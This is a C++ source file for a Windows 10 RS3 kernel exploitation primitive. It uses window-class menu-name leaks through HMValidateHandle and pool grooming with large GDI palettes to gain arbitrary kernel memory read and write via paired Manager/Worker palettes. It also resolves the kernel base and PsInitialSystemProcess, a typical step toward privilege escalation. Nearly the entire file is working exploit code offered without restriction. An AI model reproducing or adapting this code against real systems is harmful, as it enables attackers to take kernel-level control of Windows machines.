
/*

	LeakPal.cc
  
  This module is a gdi port of arbitrary r/w to rs3, for more information reffer to:
  https://github.com/akayn/demos/blob/master/Win10/BitMap_Win_10_15063.0.amd64fre.rs2_release.170317-1834/GdiExp.cc
  
  ! See The Offsets....
	
	ref: https://labs.bluefrostsecurity.de/files/Abusing_GDI_for_ring0_exploit_primitives_Evolution_Slides.pdf
	
<---- 
 
	Copy & usage of this software are allowed without any restrictions.
	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.
	
 ---->
*/


#pragma once
#include "stdafx.h"
#include <Windows.h>
#include <stdio.h>
#include <cstdint>
#include <conio.h>

int count = 0;


#pragma comment(lib, "Gdi32.lib")

#include <Wingdi.h>

typedef void*(NTAPI *lHMValidateHandle)(
	HWND h,
	int type
);


typedef struct _hPal {
	HPALETTE hPal;
	DWORD64 kAddr;
	PUCHAR pFirstColor;
} HPAL, *PHPAL;


LRESULT
CALLBACK MainWProc(
	HWND hWnd, UINT uMsg,
	WPARAM wParam, LPARAM lParam
)
{
	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

lHMValidateHandle pHmValidateHandle = NULL;



BOOL
GetHMValidateHandle(
)
{


	HMODULE hUser32 = LoadLibraryA("user32.dll");
	if (hUser32 == NULL) {
		exit(GetLastError());
	}

	BYTE* pIsMenu = (BYTE *)GetProcAddress(hUser32, "IsMenu");
	if (pIsMenu == NULL) {
		exit(GetLastError());
	}
	unsigned int uiHMValidateHandleOffset = 0;
	for (unsigned int i = 0; i < 0x1000; i++) {
		BYTE* test = pIsMenu + i;
		if (*test == 0xe8) {
			uiHMValidateHandleOffset = i + 1;
			break;
		}
	}
	if (uiHMValidateHandleOffset == 0) {
		exit(GetLastError());
	}

	unsigned int addr = *(unsigned int *)(pIsMenu + uiHMValidateHandleOffset);
	unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;
	pHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + 11);
	return TRUE;
}

PUCHAR
GetNtos(
)
{
	typedef enum _SYSTEM_INFORMATION_CLASS {
		SystemBasicInformation = 0,
		SystemPerformanceInformation = 2,
		SystemTimeOfDayInformation = 3,
		SystemProcessInformation = 5,
		SystemProcessorPerformanceInformation = 8,
		SystemModuleInformation = 11,
		SystemInterruptInformation = 23,
		SystemExceptionInformation = 33,
		SystemRegistryQuotaInformation = 37,
		SystemLookasideInformation = 45
	} SYSTEM_INFORMATION_CLASS;

	typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
		HANDLE Section;
		PVOID MappedBase;
		PVOID ImageBase;
		ULONG ImageSize;
		ULONG Flags;
		USHORT LoadOrderIndex;
		USHORT InitOrderIndex;
		USHORT LoadCount;
		USHORT OffsetToFileName;
		UCHAR FullPathName[256];
	} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

	typedef struct _SYSTEM_MODULE_INFORMATION {
		ULONG NumberOfModules;
		SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
	} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

	typedef NTSTATUS(__stdcall *pfZwQuerySystemInformation)(
		SYSTEM_INFORMATION_CLASS SystemInformationClass,
		PVOID SystemInformation,
		ULONG SystemInformationLength,
		PULONG ReturnLength
		);

	DWORD len;
	PSYSTEM_MODULE_INFORMATION ModuleInfo;
	PVOID Nt = NULL;
	pfZwQuerySystemInformation ZwQuerySystemInformation = (pfZwQuerySystemInformation)GetProcAddress(
		GetModuleHandle(L"ntdll.dll"), "ZwQuerySystemInformation");
	ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(
		NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ModuleInfo) { return NULL; }
	ZwQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);
	Nt = ModuleInfo->Module[0].ImageBase;
	VirtualFree(ModuleInfo, 0, MEM_RELEASE);
	return (PUCHAR)Nt;
}

DWORD64
GetPsInitialSystemProcess(
)
{
	PUCHAR NtBaddr = (PUCHAR)GetNtos();
	printf("[+] ntoskrnl Base Addr: %p\n", NtBaddr);
	PUCHAR ntos = (PUCHAR)LoadLibrary(L"ntoskrnl.exe");
	PUCHAR addr = (PUCHAR)GetProcAddress((HMODULE)ntos, "PsInitialSystemProcess");
	auto Psi = addr - ntos + NtBaddr;
	printf("[+] PsInitialSystemProcess: %p\n", Psi);
	return (DWORD64)Psi;
}

ATOM
RegisterhWnd(
	LPCWSTR class_name,
	LPCWSTR menu_name
)
{
	WNDCLASS wind_class = WNDCLASS();
	wind_class.lpszClassName = class_name;
	wind_class.lpszMenuName = menu_name;
	wind_class.lpfnWndProc = MainWProc;
	return RegisterClassW(&wind_class);
}

void
DestroyWnd(
	int n,
	HWND hWnd
)
{
	DestroyWindow(hWnd);
	if (n == 0) {
		UnregisterClassW(L"aaa", NULL);
	}
	else {
		UnregisterClassW(L"bbb", NULL);
	}
}

HWND
CreateWindowObject(
	int n
)
{
	WCHAR* Buff = new WCHAR[0x8F0];
	RtlSecureZeroMemory(Buff, 0x8F0); 
	RtlFillMemory(Buff, 0x8F0, '\x41');
	if (n == 0) {
		ATOM Cls = RegisterhWnd(L"aaa", Buff); 
		return CreateWindowExW(0, L"aaa", NULL, 0, 0, 0, 0, 0, 0, 0, NULL, 0);
	}
	else {
		ATOM Cls = RegisterhWnd(L"bbb", Buff); 
		return CreateWindowExW(0, L"bbb", NULL, 0, 0, 0, 0, 0, 0, 0, NULL, 0);
	}
}

DWORD64
LeaklpszMenuName(
	HWND hWnd
)
{
	DWORD64 pCLSOffset = 0xa8;
	DWORD64 lpszMenuNameOffset = 0x90; 
	BOOL bRet = GetHMValidateHandle(); 
	void* lpUserDesktopHeapWindow = pHmValidateHandle(hWnd, 1);
	uintptr_t ulClientDelta = *reinterpret_cast<DWORD64 *>((DWORD64*)(lpUserDesktopHeapWindow)+0x20) - (
		DWORD64)(lpUserDesktopHeapWindow);
	uintptr_t KerneltagCLS = *reinterpret_cast<DWORD64 *>((DWORD64)lpUserDesktopHeapWindow + pCLSOffset);

  // notice the offset
	uintptr_t lpszMenuName = *reinterpret_cast<DWORD64 *>((DWORD64)KerneltagCLS - ulClientDelta + 0x98); 

	return lpszMenuName;
}

void
HeapSpray(
	) 
{
	for (int c = 0; c <= 0x450; c++) {
		HWND TestWindowHandle = CreateWindowObject(0);
		DestroyWnd(0, TestWindowHandle);
	}
}

BOOL
Leak(
	int y,
	HPAL &hPal
)
{

	DWORD64 Curr, Curr2 = NULL;

	for (int i = 0; i <= 20; i++) { 
		//HeapSpray();
		HWND TestWindowHandle = CreateWindowObject(0);
		Curr = LeaklpszMenuName(TestWindowHandle);
		DestroyWnd(0,TestWindowHandle);
		LOGPALETTE *lPalette;
		lPalette = (LOGPALETTE*)malloc(sizeof(LOGPALETTE) + (0x13FE - 1) * sizeof(PALETTEENTRY));
		lPalette->palNumEntries = 0x13FE;
		lPalette->palVersion = 0x0300;
		hPal.hPal = CreatePalette(lPalette);
		hPal.kAddr = Curr;
		hPal.pFirstColor = (PUCHAR)(Curr + 0x80);
		HWND TestWindowHandle2 = CreateWindowObject(1);
		Curr2 = LeaklpszMenuName(TestWindowHandle2);
		DestroyWnd(1,TestWindowHandle);
		if (Curr != Curr2) {
			return TRUE;
		}
		else {
			DeleteObject(hPal.hPal);
			hPal.hPal = NULL;
			hPal.kAddr = NULL;
			hPal.pFirstColor = NULL;
		}
	}
	return FALSE;
}

void 
SetAddress(
	LPVOID* address,
	HPALETTE &hpManager
	) 
{
	//SetPaletteEntries(hpManager, 0x13FE, 1, (PALETTEENTRY*)&address);
	SetPaletteEntries(hpManager, 0x13FE, 1, (PALETTEENTRY*)&address);
}

void 
ArbitraryWrite(
	LPVOID* data,
	HPALETTE &hpWorker
	) 
{
	UINT len = sizeof(DWORD64);
	SetPaletteEntries((HPALETTE)hpWorker, 0, len, (PALETTEENTRY*)data);
}

DWORD64
ArbitraryRead(
	DWORD64 src,
	HPALETTE &hpWorker,
	HPALETTE &hpManager
	) 
{
	DWORD64 len = sizeof(src);
	LPVOID dst = VirtualAlloc(
		0, sizeof(src),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);
	SetAddress((LPVOID *)&src, hpManager);
	auto bRet = GetPaletteEntries((HPALETTE)hpWorker, 0, len, (LPPALETTEENTRY)dst);
	DWORD64 oRetv = *(DWORD64 *)dst;
	VirtualFree( &dst , sizeof(LPVOID) , MEM_FREE | MEM_RELEASE );
	return oRetv;
}

/*

	Leak Only ..
  
*/

int
__cdecl
main(
	void
)
{

	printf("\n[!] feng shui ..\n");
	printf("[>] Spraying the pool\n");
	printf("[>] leaking lpszMenuName\n");


	HPAL mpl;
	HPAL wpl;


	if (!Leak(0, mpl)) {
		exit(GetLastError());
	}
	if (!Leak(1, wpl)) {
		exit(GetLastError());
	}

	printf("\n[+] &pHmValidateHandle: 0x%llx \n", pHmValidateHandle);
	printf("[+] hManager: 0x%llx\n", &mpl.hPal);
	printf("[+] hWorker:  0x%llx\n", &wpl.hPal);
	printf("[+] &Manager *pFirstColor->0x%llx\n", mpl.kAddr);
	printf("[+] &Worker  *pFirstColor->0x%llx\n", wpl.kAddr); 
	
	getch();
	return 0;
}


